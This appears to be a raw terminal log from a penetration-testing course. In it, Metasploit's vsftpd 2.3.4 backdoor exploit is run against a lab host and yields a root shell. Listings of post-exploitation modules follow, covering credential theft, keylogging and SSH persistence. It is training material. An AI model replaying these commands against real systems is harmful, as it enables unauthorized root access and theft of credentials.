console.../[*] StArting the Metasploit Framework console...-[*] StaRting the Metasploit Framework console...\[*] StarTing the Metasploit Framework console...|[*] StartIng the Metasploit Framework console.../[*] StartiNg the Metasploit Framework console...-[*] StartinG the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting The Metasploit Framework console.../[*] Starting tHe Metasploit Framework console...-[*] Starting thE Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the metasploit Framework console.../[*] Starting the MEtasploit Framework console...-[*] Starting the MeTasploit Framework console...\[*] Starting the MetAsploit Framework console...|[*] Starting the MetaSploit Framework console.../[*] Starting the MetasPloit Framework console...-                                                  
+[0m[36m[0m[31m
+      .:okOOOkdc'           'cdkOOOko:.
+    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
+   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
+  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
+  oOOOOOOOO.[0m[1mMMMM[0m[31m.oOOOOoOOOOl.[0m[1mMMMM[0m[31m,OOOOOOOOo
+  dOOOOOOOO.[0m[1mMMMMMM[0m[31m.cOOOOOc.[0m[1mMMMMMM[0m[31m,OOOOOOOOx
+  lOOOOOOOO.[0m[1mMMMMMMMMM[0m[31m;d;[0m[1mMMMMMMMMM[0m[31m,OOOOOOOOl
+  .OOOOOOOO.[0m[1mMMM[0m[31m.;[0m[1mMMMMMMMMMMM[0m[31m;[0m[1mMMMM[0m[31m,OOOOOOOO.
+   cOOOOOOO.[0m[1mMMM[0m[31m.OOc.[0m[1mMMMMM[0m[31m'oOO.[0m[1mMMM[0m[31m,OOOOOOOc
+    oOOOOOO.[0m[1mMMM[0m[31m.OOOO.[0m[1mMMM[0m[31m:OOOO.[0m[1mMMM[0m[31m,OOOOOOo
+     lOOOOO.[0m[1mMMM[0m[31m.OOOO.[0m[1mMMM[0m[31m:OOOO.[0m[1mMMM[0m[31m,OOOOOl
+      ;OOOO'[0m[1mMMM[0m[31m.OOOO.[0m[1mMMM[0m[31m:OOOO.[0m[1mMMM[0m[31m;OOOO;
+       .dOOo'[0m[1mWM[0m[31m.OOOOocccxOOOO.[0m[1mMX[0m[31m'xOOd.
+         ,kOl'[0m[1mM[0m[31m.OOOOOOOOOOOOO.[0m[1mM[0m[31m'dOk,
+           :kk;.OOOOOOOOOOOOO.;Ok:
+             ;kOOOOOOOOOOOOOOOk:
+               ,xOOOOOOOOOOOx,
+                 .lOOOOOOOl.
+                    ,dOd,
+                      .[0m[0m
+
+       =[ [33mmetasploit v5.0.61-dev[0m                          ]
++ -- --=[ 1949 exploits - 1090 auxiliary - 334 post       ]
++ -- --=[ 558 payloads - 45 encoders - 10 nops            ]
++ -- --=[ 7 evasion                                       ]
+
+[?1034h[4mmsf5[0m [0m> exit -y[K[K[K
+[0m]0;root@kali: ~/Corso_PT/Day_4[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_4[00m# msfconsole iptables -Lmsfconsole 
+[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] starting the Metasploit Framework console...|[*] STarting the Metasploit Framework console.../[*] StArting the Metasploit Framework console...-[*] StaRting the Metasploit Framework console...\[*] StarTing the Metasploit Framework console...|[*] StartIng the Metasploit Framework console.../[*] StartiNg the Metasploit Framework console...-[*] StartinG the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting The Metasploit Framework console.../[*] Starting tHe Metasploit Framework console...-[*] Starting thE Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the metasploit Framework console.../[*] Starting the MEtasploit Framework console...-[*] Starting the MeTasploit Framework console...\[*] Starting the MetAsploit Framework console...|[*] Starting the MetaSploit Framework console.../[*] Starting the MetasPloit Framework console...-[*] Starting the MetaspLoit Framework console...\[*] Starting the MetasplOit Framework console...|[*] Starting the MetasploIt Framework console.../[*] Starting the MetasploiT Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit framework console...|[*] Starting the Metasploit FRamework console.../[*] Starting the Metasploit FrAmework console...-[*] Starting the Metasploit FraMework console...\[*] Starting the Metasploit FramEwork console...|[*] Starting the Metasploit FrameWork console.../[*] Starting the Metasploit FramewOrk console...-[*] Starting the Metasploit FramewoRk console...\[*] Starting the Metasploit FrameworK console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework Console...-[*] Starting the Metasploit Framework cOnsole...\[*] Starting the Metasploit Framework coNsole...|[*] Starting the Metasploit Framework conSole.../[*] Starting the Metasploit Framework consOle...-[*] Starting the Metasploit Framework consoLe...\[*] Starting the Metasploit Framework consolE...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] starting the Metasploit Framework console...|[*] STarting the Metasploit Framework console.../[*] StArting the Metasploit Framework console...-[*] StaRting the Metasploit Framework console...\[*] StarTing the Metasploit Framework console...|[*] StartIng the Metasploit Framework console.../[*] StartiNg the Metasploit Framework console...-[*] StartinG the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting The Metasploit Framework console.../[*] Starting tHe Metasploit Framework console...-[*] Starting thE Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the metasploit Framework console.../[*] Starting the MEtasploit Framework console...-[*] Starting the MeTasploit Framework console...\[*] Starting the MetAsploit Framework console...|[*] Starting the MetaSploit Framework console.../[*] Starting the MetasPloit Framework console...-[*] Starting the MetaspLoit Framework console...\[*] Starting the MetasplOit Framework console...|[*] Starting the MetasploIt Framework console.../[*] Starting the MetasploiT Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit framework console...|[*] Starting the Metasploit FRamework console.../[*] Starting the Metasploit FrAmework console...-[*] Starting the Metasploit FraMework console...\[*] Starting the Metasploit FramEwork console...|[*] Starting the Metasploit FrameWork console.../[*] Starting the Metasploit FramewOrk console...-[*] Starting the Metasploit FramewoRk console...\[*] Starting the Metasploit FrameworK console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework Console...-[*] Starting the Metasploit Framework cOnsole...\[*] Starting the Metasploit Framework coNsole...|[*] Starting the Metasploit Framework conSole.../[*] Starting the Metasploit Framework consOle...-[*] Starting the Metasploit Framework consoLe...\[*] Starting the Metasploit Framework consolE...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] starting the Metasploit Framework console...|[*] STarting the Metasploit Framework console.../[*] StArting the Metasploit Framework console...-[*] StaRting the Metasploit Framework console...\[*] StarTing the Metasploit Framework console...|[*] StartIng the Metasploit Framework console.../[*] StartiNg the Metasploit Framework console...-[*] StartinG the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting The Metasploit Framework console.../[*] Starting tHe Metasploit Framework console...-[*] Starting thE Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the metasploit Framework console.../[*] Starting the MEtasploit Framework console...-[*] Starting the MeTasploit Framework console...\[*] Starting the MetAsploit Framework console...|[*] Starting the MetaSploit Framework console.../[*] Starting the MetasPloit Framework console...-[*] Starting the MetaspLoit Framework console...\[*] Starting the MetasplOit Framework console...|[*] Starting the MetasploIt Framework console.../[*] Starting the MetasploiT Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit framework console...|[*] Starting the Metasploit FRamework console.../[*] Starting the Metasploit FrAmework console...-[*] Starting the Metasploit FraMework console...\[*] Starting the Metasploit FramEwork console...|[*] Starting the Metasploit FrameWork console.../[*] Starting the Metasploit FramewOrk console...-[*] Starting the Metasploit FramewoRk console...\[*] Starting the Metasploit FrameworK console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework Console...-[*] Starting the Metasploit Framework cOnsole...\[*] Starting the Metasploit Framework coNsole...|[*] Starting the Metasploit Framework conSole.../[*] Starting the Metasploit Framework consOle...-[*] Starting the Metasploit Framework consoLe...\[*] Starting the Metasploit Framework consolE...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] starting the Metasploit Framework console...|[*] STarting the Metasploit Framework console.../[*] StArting the Metasploit Framework console...-[*] StaRting the Metasploit Framework console...\[*] StarTing the Metasploit Framework console...|[*] StartIng the Metasploit Framework console.../[*] StartiNg the Metasploit Framework console...-[*] StartinG the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting The Metasploit Framework console.../[*] Starting tHe Metasploit Framework console...-[*] Starting thE Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the metasploit Framework console.../[*] Starting the MEtasploit Framework console...-[*] Starting the MeTasploit Framework console...\[*] Starting the MetAsploit Framework console...|[*] Starting the MetaSploit Framework console.../[*] Starting the MetasPloit Framework console...-[*] Starting the MetaspLoit Framework console...\[*] Starting the MetasplOit Framework console...|[*] Starting the MetasploIt Framework console.../[*] Starting the MetasploiT Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit framework console...|[*] Starting the Metasploit FRamework console.../[*] Starting the Metasploit FrAmework console...-[*] Starting the Metasploit FraMework console...\[*] Starting the Metasploit FramEwork console...|[*] Starting the Metasploit FrameWork console.../[*] Starting the Metasploit FramewOrk console...-[*] Starting the Metasploit FramewoRk console...\[*] Starting the Metasploit FrameworK console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework Console...-[*] Starting the Metasploit Framework cOnsole...\[*] Starting the Metasploit Framework coNsole...|[*] Starting the Metasploit Framework conSole.../[*] Starting the Metasploit Framework consOle...-[*] Starting the Metasploit Framework consoLe...\[*] Starting the Metasploit Framework consolE...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] starting the Metasploit Framework console...|[*] STarting the Metasploit Framework console.../[*] StArting the Metasploit Framework console...-[*] StaRting the Metasploit Framework console...\[*] StarTing the Metasploit Framework console...|[*] StartIng the Metasploit Framework console.../[*] StartiNg the Metasploit Framework console...-[*] StartinG the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting The Metasploit Framework console.../[*] Starting tHe Metasploit Framework console...-[*] Starting thE Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the metasploit Framework console.../[*] Starting the MEtasploit Framework console...-[*] Starting the MeTasploit Framework console...\[*] Starting the MetAsploit Framework console...|[*] Starting the MetaSploit Framework console.../[*] Starting the MetasPloit Framework console...-[*] Starting the MetaspLoit Framework console...\[*] Starting the MetasplOit Framework console...|[*] Starting the MetasploIt Framework console.../[*] Starting the MetasploiT Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit framework console...|[*] Starting the Metasploit FRamework console.../[*] Starting the Metasploit FrAmework console...-[*] Starting the Metasploit FraMework console...\[*] Starting the Metasploit FramEwork console...|                                                  
+[0m[36m[0m[37m
+Unable to handle kernel NULL pointer dereference at virtual address 0xd34db33f
+EFLAGS: 00010046
+eax: 00000001 ebx: f77c8c00 ecx: 00000000 edx: f77f0001
+esi: 803bf014 edi: 8023c755 ebp: 80237f84 esp: 80237f60
+ds: 0018   es: 0018  ss: 0018
+Process Swapper (Pid: 0, process nr: 0, stackpage=80377000)
+
+[1m
+Stack: 90909090990909090990909090
+       90909090990909090990909090
+       90909090.90909090.90909090
+       90909090.90909090.90909090
+       90909090.90909090.09090900
+       90909090.90909090.09090900
+       ..........................
+       cccccccccccccccccccccccccc
+       cccccccccccccccccccccccccc
+       ccccccccc.................
+       cccccccccccccccccccccccccc
+       cccccccccccccccccccccccccc
+       .................ccccccccc
+       cccccccccccccccccccccccccc
+       cccccccccccccccccccccccccc
+       ..........................
+       ffffffffffffffffffffffffff
+       ffffffff..................
+       ffffffffffffffffffffffffff
+       ffffffff..................
+       ffffffff..................
+       ffffffff..................
+[0m
+
+[33mCode: 00 00 00 00 M3 T4 SP L0 1T FR 4M 3W OR K! V3 R5 I0 N5 00 00 00 00[0m
+Aiee, Killing Interrupt handler
+[31mKernel panic: Attempted to kill the idle task!
+In swapper task - not syncing[0m
+[0m
+
+       =[ [33mmetasploit v5.0.61-dev[0m                          ]
++ -- --=[ 1949 exploits - 1090 auxiliary - 334 post       ]
++ -- --=[ 558 payloads - 45 encoders - 10 nops            ]
++ -- --=[ 7 evasion                                       ]
+
+[?1034h[4mmsf5[0m [0m> 
+[0m[4mmsf5[0m [0m> search vsft
+[0m
+Matching Modules
+================
+
+   #  Name                                  Disclosure Date  Rank       Check  Description
+   -  ----                                  ---------------  ----       -----  -----------
+   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
+
+
+[4mmsf5[0m [0m> use exploit/unix/ftp/vsftpd_234_backdoor 
+[0m[4mmsf5[0m exploit([1m[31munix/ftp/vsftpd_234_backdoor[0m) [0m> show options 
+[0m
+Module options (exploit/unix/ftp/vsftpd_234_backdoor):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT   21               yes       The target port (TCP)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+[4mmsf5[0m exploit([1m[31munix/ftp/vsftpd_234_backdoor[0m) [0m> set RHOSTS 192.168.58.129
+[0mRHOSTS => 192.168.58.129
+[4mmsf5[0m exploit([1m[31munix/ftp/vsftpd_234_backdoor[0m) [0m> show payloads 
+[0m
+Compatible Payloads
+===================
+
+   #  Name               Disclosure Date  Rank    Check  Description
+   -  ----               ---------------  ----    -----  -----------
+   0  cmd/unix/interact                   normal  No     Unix Command, Interact with Established Connection
+
+[4mmsf5[0m exploit([1m[31munix/ftp/vsftpd_234_backdoor[0m) [0m> set payload cmd/unix/interact 
+[0mpayload => cmd/unix/interact
+[4mmsf5[0m exploit([1m[31munix/ftp/vsftpd_234_backdoor[0m) [0m> 
+[0m[4mmsf5[0m exploit([1m[31munix/ftp/vsftpd_234_backdoor[0m) [0m> run
+[0m
+[1m[34m[*][0m 192.168.58.129:21 - Banner: 220 (vsFTPd 2.3.4)
+[1m[34m[*][0m 192.168.58.129:21 - USER: 331 Please specify the password.
+[1m[32m[+][0m 192.168.58.129:21 - Backdoor service has been spawned, handling...
+[1m[32m[+][0m 192.168.58.129:21 - UID: uid=0(root) gid=0(root)
+[1m[34m[*][0m Found shell.
+[1m[34m[*][0m Command shell session 1 opened (192.168.58.131:36437 -> 192.168.58.129:6200) at 2019-11-28 19:40:24 +0100
+
+[0mid
+uid=0(root) gid=0(root)
+^Z
+Background session 1? [y/N]  y
+[4mmsf5[0m exploit([1m[31munix/ftp/vsftpd_234_backdoor[0m) [0m> 
+[0m[4mmsf5[0m exploit([1m[31munix/ftp/vsftpd_234_backdoor[0m) [0m> 
+[0m[4mmsf5[0m exploit([1m[31munix/ftp/vsftpd_234_backdoor[0m) [0m> 
+[0m[4mmsf5[0m exploit([1m[31munix/ftp/vsftpd_234_backdoor[0m) [0m> search type:post meterpreter
+[0m
+Matching Modules
+================
+
+   #   Name                                            Disclosure Date  Rank    Check  Description
+   -   ----                                            ---------------  ----    -----  -----------
+   0   post/multi/gather/multi_command                                  normal  No     Multi Gather Run Shell Command Resource File
+   1   post/multi/gather/run_console_rc_file                            normal  No     Multi Gather Run Console Resource File
+   2   post/multi/gather/ubiquiti_unifi_backup                          normal  No     Multi Gather Ubiquiti UniFi Controller Backup
+   3   post/multi/manage/autoroute                                      normal  No     Multi Manage Network Route via Meterpreter Session
+   4   post/multi/manage/record_mic                                     normal  No     Multi Manage Record Microphone
+   5   post/multi/manage/shell_to_meterpreter                           normal  No     Shell to Meterpreter Upgrade
+   6   post/multi/recon/local_exploit_suggester                         normal  No     Multi Recon Local Exploit Suggester
+   7   post/windows/gather/arp_scanner                                  normal  No     Windows Gather ARP Scanner
+   8   post/windows/gather/wmic_command                                 normal  No     Windows Gather Run Specified WMIC Command
+   9   post/windows/manage/archmigrate                                  normal  No     Architecture Migrate
+   10  post/windows/manage/exec_powershell                              normal  No     Windows Powershell Execution Post Module
+   11  post/windows/manage/forward_pageant                              normal  No     Forward SSH Agent Requests To Remote Pageant
+   12  post/windows/manage/migrate                                      normal  No     Windows Manage Process Migration
+   13  post/windows/manage/multi_meterpreter_inject                     normal  No     Windows Manage Inject in Memory Multiple Payloads
+   14  post/windows/manage/powershell/exec_powershell                   normal  No     Windows Manage PowerShell Download and/or Execute
+   15  post/windows/manage/priv_migrate                                 normal  No     Windows Manage Privilege Based Process Migration 
+
+
+[4mmsf5[0m exploit([1m[31munix/ftp/vsftpd_234_backdoor[0m) [0m> use post/multi/manage/shell_to_meterpreter 
+[0m[4mmsf5[0m post([1m[31mmulti/manage/shell_to_meterpreter[0m) [0m> services type:post ssh
+[0m[1m[31m[-][0m Invalid host parameter, type:post.
+[4mmsf5[0m post([1m[31mmulti/manage/shell_to_meterpreter[0m) [0m> services type:post ssh[K[K[K[K[Kt
+[0m[1m[31m[-][0m Invalid host parameter, type:post.
+[4mmsf5[0m post([1m[31mmulti/manage/shell_to_meterpreter[0m) [0m> services type:post[C[P type:post[P type:post[P type:post[P type:post[P type:post[P type:posta type:postrch type:post[C[C[C[C[C[C[C[C[C[C ssh
+[0m
+Matching Modules
+================
+
+   #  Name                                           Disclosure Date  Rank       Check  Description
+   -  ----                                           ---------------  ----       -----  -----------
+   0  post/linux/gather/enum_network                                  normal     No     Linux Gather Network Information
+   1  post/linux/manage/sshkey_persistence                            excellent  No     SSH Key Persistence
+   2  post/multi/gather/jenkins_gather                                normal     No     Jenkins Credential Collector
+   3  post/multi/gather/ssh_creds                                     normal     No     Multi Gather OpenSSH PKI Credentials Collection
+   4  post/windows/gather/credentials/mremote                         normal     No     Windows Gather mRemote Saved Password Extraction
+   5  post/windows/gather/enum_putty_saved_sessions                   normal     No     PuTTY Saved Sessions Enumeration Module
+   6  post/windows/manage/forward_pageant                             normal     No     Forward SSH Agent Requests To Remote Pageant
+
+
+[4mmsf5[0m post([1m[31mmulti/manage/shell_to_meterpreter[0m) [0m> search type:post ssh[K[K[K[K
+[0m
+Matching Modules
+================
+
+   #    Name                                                    Disclosure Date  Rank       Check  Description
+   -    ----                                                    ---------------  ----       -----  -----------
+   0    post/aix/hashdump                                                        normal     No     AIX Gather Dump Password Hashes
+   1    post/android/capture/screen                                              normal     No     Android Screen Capture
+   2    post/android/gather/sub_info                                             normal     No     extracts subscriber info from target device
+   3    post/android/gather/wireless_ap                                          normal     No     Displays wireless SSIDs and PSKs
+   4    post/android/manage/remove_lock                         2013-10-11       normal     No     Android Settings Remove Device Locks (4.0-4.3)
+   5    post/android/manage/remove_lock_root                                     normal     No     Android Root Remove Device Locks (root)
+   6    post/apple_ios/gather/ios_image_gather                                   normal     No     iOS Image Gatherer
+   7    post/apple_ios/gather/ios_text_gather                                    normal     No     iOS Text Gatherer
+   8    post/cisco/gather/enum_cisco                                             normal     No     Cisco Gather Device General Information
+   9    post/firefox/gather/cookies                             2014-03-26       normal     No     Firefox Gather Cookies from Privileged Javascript Shell
+   10   post/firefox/gather/history                             2014-04-11       normal     No     Firefox Gather History from Privileged Javascript Shell
+   11   post/firefox/gather/passwords                           2014-04-11       normal     No     Firefox Gather Passwords from Privileged Javascript Shell
+   12   post/firefox/gather/xss                                                  normal     No     Firefox XSS
+   13   post/firefox/manage/webcam_chat                         2014-05-13       normal     No     Firefox Webcam Chat on Privileged Javascript Shell
+   14   post/hardware/automotive/can_flood                                       normal     No     CAN Flood
+   15   post/hardware/automotive/canprobe                                        normal     No     Module to Probe Different Data Points in a CAN Packet
+   16   post/hardware/automotive/getvinfo                                        normal     No     Get the Vehicle Information Such as the VIN from the Target Module
+   17   post/hardware/automotive/identifymodules                                 normal     No     Scan CAN Bus for Diagnostic Modules
+   18   post/hardware/automotive/malibu_overheat                                 normal     No     Sample Module to Flood Temp Gauge on 2006 Malibu
+   19   post/hardware/automotive/pdt                                             normal     No     Check For and Prep the Pyrotechnic Devices (Airbags, Battery Clamps, etc.)
+   20   post/hardware/rftransceiver/rfpwnon                                      normal     No     Brute Force AM/OOK (ie: Garage Doors)
+   21   post/hardware/rftransceiver/transmitter                                  normal     No     RF Transceiver Transmitter
+   22   post/hardware/zigbee/zstumbler                                           normal     No     Sends Beacons to Scan for Active ZigBee Networks
+   23   post/juniper/gather/enum_juniper                                         normal     No     Juniper Gather Device General Information
+   24   post/linux/busybox/enum_connections                                      normal     No     BusyBox Enumerate Connections
+   25   post/linux/busybox/enum_hosts                                            normal     No     BusyBox Enumerate Host Names
+   26   post/linux/busybox/jailbreak                                             normal     No     BusyBox Jailbreak 
+   27   post/linux/busybox/ping_net                                              normal     No     BusyBox Ping Network Enumeration
+   28   post/linux/busybox/set_dmz                                               normal     No     BusyBox DMZ Configuration
+   29   post/linux/busybox/set_dns                                               normal     No     BusyBox DNS Configuration
+   30   post/linux/busybox/smb_share_root                                        normal     No     BusyBox SMB Sharing
+   31   post/linux/busybox/wget_exec                                             normal     No     BusyBox Download and Execute
+   32   post/linux/dos/xen_420_dos                                               normal     No     Linux DoS Xen 4.2.0 2012-5525
+   33   post/linux/gather/checkcontainer                                         normal     No     Linux Gather Container Detection
+   34   post/linux/gather/checkvm                                                normal     No     Linux Gather Virtual Environment Detection
+   35   post/linux/gather/ecryptfs_creds                                         normal     No     Gather eCryptfs Metadata
+   36   post/linux/gather/enum_commands                                          normal     No     Testing commands needed in a function
+   37   post/linux/gather/enum_configs                                           normal     No     Linux Gather Configurations
+   38   post/linux/gather/enum_network                                           normal     No     Linux Gather Network Information
+   39   post/linux/gather/enum_protections                                       normal     No     Linux Gather Protection Enumeration
+   40   post/linux/gather/enum_psk                                               normal     No     Linux Gather 802-11-Wireless-Security Credentials
+   41   post/linux/gather/enum_system                                            normal     No     Linux Gather System and User Information
+   42   post/linux/gather/enum_users_history                                     normal     No     Linux Gather User History
+   43   post/linux/gather/enum_xchat                                             normal     No     Linux Gather XChat Enumeration
+   44   post/linux/gather/gnome_commander_creds                                  normal     No     Linux Gather Gnome-Commander Creds
+   45   post/linux/gather/gnome_keyring_dump                                     normal     No     Gnome-Keyring Dump
+   46   post/linux/gather/hashdump                                               normal     No     Linux Gather Dump Password Hashes for Linux Systems
+   47   post/linux/gather/mount_cifs_creds                                       normal     No     Linux Gather Saved mount.cifs/mount.smbfs Credentials
+   48   post/linux/gather/openvpn_credentials                                    normal     No     OpenVPN Gather Credentials
+   49   post/linux/gather/phpmyadmin_credsteal                                   normal     No     Phpmyadmin credentials stealer
+   50   post/linux/gather/pptpd_chap_secrets                                     normal     No     Linux Gather PPTP VPN chap-secrets Credentials
+   51   post/linux/gather/tor_hiddenservices                                     normal     No     Linux Gather TOR Hidden Services
+   52   post/linux/manage/dns_spoofing                                           normal     No     Native DNS Spoofing module
+   53   post/linux/manage/download_exec                                          normal     No     Linux Manage Download and Execute
+   54   post/linux/manage/iptables_removal                                       normal     No     IPTABLES rules removal
+   55   post/linux/manage/pseudo_shell                                           normal     No     Pseudo-Shell Post-Exploitation Module
+   56   post/linux/manage/sshkey_persistence                                     excellent  No     SSH Key Persistence
+   57   post/multi/escalate/aws_create_iam_user                                  normal     No     Create an AWS IAM User
+   58   post/multi/escalate/cups_root_file_read                 2012-11-20       normal     No     CUPS 1.6.1 Root File Read
+   59   post/multi/escalate/metasploit_pcaplog                  2012-07-16       manual     No     Multi Escalate Metasploit pcap_log Local Privilege Escalation
+   60   post/multi/gather/apple_ios_backup                                       normal     No     Windows Gather Apple iOS MobileSync Backup File Collection
+   61   post/multi/gather/aws_ec2_instance_metadata                              normal     No     Gather AWS EC2 Instance Metadata
+   62   post/multi/gather/aws_keys                                               normal     No     UNIX Gather AWS Keys
+   63   post/multi/gather/check_malware                                          normal     No     Multi Gather Malware Verifier
+   64   post/multi/gather/chrome_cookies                                         normal     No     Chrome Gather Cookies
+   65   post/multi/gather/dbvis_enum                                             normal     No     Multi Gather DbVisualizer Connections Settings
+   66   post/multi/gather/dns_bruteforce                                         normal     No     Multi Gather DNS Forward Lookup Bruteforce
+   67   post/multi/gather/dns_reverse_lookup                                     normal     No     Multi Gather DNS Reverse Lookup Scan
+   68   post/multi/gather/dns_srv_lookup                                         normal     No     Multi Gather DNS Service Record Lookup Scan
+   69   post/multi/gather/docker_creds                                           normal     No     Multi Gather Docker Credentials Collection
+   70   post/multi/gather/enum_vbox                                              normal     No     Multi Gather VirtualBox VM Enumeration
+   71   post/multi/gather/env                                                    normal     No     Multi Gather Generic Operating System Environment Settings
+   72   post/multi/gather/fetchmailrc_creds                                      normal     No     UNIX Gather .fetchmailrc Credentials
+   73   post/multi/gather/filezilla_client_cred                                  normal     No     Multi Gather FileZilla FTP Client Credential Collection
+   74   post/multi/gather/find_vmx                                               normal     No     Multi Gather VMWare VM Identification
+   75   post/multi/gather/firefox_creds                                          normal     No     Multi Gather Firefox Signon Credential Collection
+   76   post/multi/gather/gpg_creds                                              normal     No     Multi Gather GnuPG Credentials Collection
+   77   post/multi/gather/irssi_creds                                            normal     No     Multi Gather IRSSI IRC Password(s)
+   78   post/multi/gather/jboss_gather                                           normal     No     Jboss Credential Collector
+   79   post/multi/gather/jenkins_gather                                         normal     No     Jenkins Credential Collector
+   80   post/multi/gather/lastpass_creds                                         normal     No     LastPass Vault Decryptor
+   81   post/multi/gather/maven_creds                                            normal     No     Multi Gather Maven Credentials Collection
+   82   post/multi/gather/multi_command                                          normal     No     Multi Gather Run Shell Command Resource File
+   83   post/multi/gather/netrc_creds                                            normal     No     UNIX Gather .netrc Credentials
+   84   post/multi/gather/pgpass_creds                                           normal     No     Multi Gather pgpass Credentials
+   85   post/multi/gather/pidgin_cred                                            normal     No     Multi Gather Pidgin Instant Messenger Credential Collection
+   86   post/multi/gather/ping_sweep                                             normal     No     Multi Gather Ping Sweep
+   87   post/multi/gather/remmina_creds                                          normal     No     UNIX Gather Remmina Credentials
+   88   post/multi/gather/resolve_hosts                                          normal     No     Multi Gather Resolve Hosts
+   89   post/multi/gather/rsyncd_creds                                           normal     No     UNIX Gather RSYNC Credentials
+   90   post/multi/gather/rubygems_api_key                                       normal     No     Multi Gather RubyGems API Key
+   91   post/multi/gather/run_console_rc_file                                    normal     No     Multi Gather Run Console Resource File
+   92   post/multi/gather/skype_enum                                             normal     No     Multi Gather Skype User Data Enumeration
+   93   post/multi/gather/ssh_creds                                              normal     No     Multi Gather OpenSSH PKI Credentials Collection
+   94   post/multi/gather/thunderbird_creds                                      normal     No     Multi Gather Mozilla Thunderbird Signon Credential Collection
+   95   post/multi/gather/tomcat_gather                                          normal     No     Gather Tomcat Credentials
+   96   post/multi/gather/ubiquiti_unifi_backup                                  normal     No     Multi Gather Ubiquiti UniFi Controller Backup
+   97   post/multi/gather/wlan_geolocate                                         normal     No     Multiplatform WLAN Enumeration and Geolocation
+   98   post/multi/general/close                                                 normal     No     Multi Generic Operating System Session Close
+   99   post/multi/general/execute                                               normal     No     Multi Generic Operating System Session Command Execution
+   100  post/multi/general/wall                                                  normal     No     Write Messages to Users
+   101  post/multi/manage/autoroute                                              normal     No     Multi Manage Network Route via Meterpreter Session
+   102  post/multi/manage/dbvis_add_db_admin                                     normal     No     Multi Manage DbVisualizer Add Db Admin
+   103  post/multi/manage/dbvis_query                                            normal     No     Multi Manage DbVisualizer Query
+   104  post/multi/manage/hsts_eraser                                            normal     No     Web browsers HSTS entries eraser
+   105  post/multi/manage/multi_post                                             normal     No     Multi Manage Post Module Macro Execution
+   106  post/multi/manage/open                                                   normal     No     Open a file or URL on the target computer
+   107  post/multi/manage/play_youtube                                           normal     No     Multi Manage YouTube Broadcast
+   108  post/multi/manage/record_mic                                             normal     No     Multi Manage Record Microphone
+   109  post/multi/manage/screensaver                                            normal     No     Multi Manage the screensaver of the target computer
+   110  post/multi/manage/set_wallpaper                                          normal     No     Multi Manage Set Wallpaper
+   111  post/multi/manage/shell_to_meterpreter                                   normal     No     Shell to Meterpreter Upgrade
+   112  post/multi/manage/sudo                                                   normal     No     Multiple Linux / Unix Post Sudo Upgrade Shell
+   113  post/multi/manage/system_session                                         normal     No     Multi Manage System Remote TCP Shell Session
+   114  post/multi/manage/upload_exec                                            normal     No     Upload and Execute
+   115  post/multi/manage/zip                                                    normal     No     Multi Manage File Compressor
+   116  post/multi/recon/local_exploit_suggester                                 normal     No     Multi Recon Local Exploit Suggester
+   117  post/multi/recon/multiport_egress_traffic                                normal     No     Generate TCP/UDP Outbound Traffic On Multiple Ports
+   118  post/multi/recon/sudo_commands                                           normal     No     Sudo Commands
+   119  post/osx/admin/say                                                       normal     No     OS X Text to Speech Utility
+   120  post/osx/capture/keylog_recorder                                         normal     No     OSX Capture Userspace Keylogger
+   121  post/osx/capture/screen                                                  normal     No     OSX Screen Capture
+   122  post/osx/gather/apfs_encrypted_volume_passwd            2018-03-21       normal     Yes    Mac OS X APFS Encrypted Volume Password Disclosure
+   123  post/osx/gather/autologin_password                                       normal     No     OSX Gather Autologin Password as Root
+   124  post/osx/gather/enum_adium                                               normal     No     OS X Gather Adium Enumeration
